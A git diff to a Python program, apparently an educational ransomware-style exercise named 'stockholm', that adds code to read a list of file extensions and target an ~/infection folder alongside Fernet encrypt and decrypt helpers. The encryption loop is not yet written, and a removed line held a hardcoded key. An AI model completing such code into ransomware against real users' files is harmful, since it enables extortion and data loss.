@@ -13,6 +13,12 @@ from pathlib import Path
 from cryptography.fernet import Fernet
 
 VERSION = 1.0
+def get_extentions(path_to_file: str) -> dict:
+    d = {}
+    with open(path_to_file) as f:
+        for line in f:
+            d[line.rstrip()] = line.rstrip()
+    return d
 
 def create_key() -> bytes:
         key = Fernet.generate_key()
@@ -43,9 +49,11 @@ def decrypt_file(file_to_decrypt: str, key: bytes):
         write_content_file(file_to_decrypt, f.decrypt(content_to_decrypt))
 
 def stockholm(key: bytes):
-    home = Path.home()
-
-
+    extentions = get_extentions("extensions.txt")
+    home = Path.home().as_posix()
+    infection_dir = home + "/infection"
+    print(extentions)
+    
 
 def main():
     parser = argparse.ArgumentParser()
@@ -63,9 +71,7 @@ def main():
         key = args.key
     else:
         key = create_key()
-
-    # encrypt_file("Makefile_to_c",key)
-    decrypt_file("Makefile_to_c.ft",b'LmXY5Ljf8EFk8zFeKAr4oWlyptDgsI3M0dSACeJfK_E=')
+    stockholm(key)
 
 
 
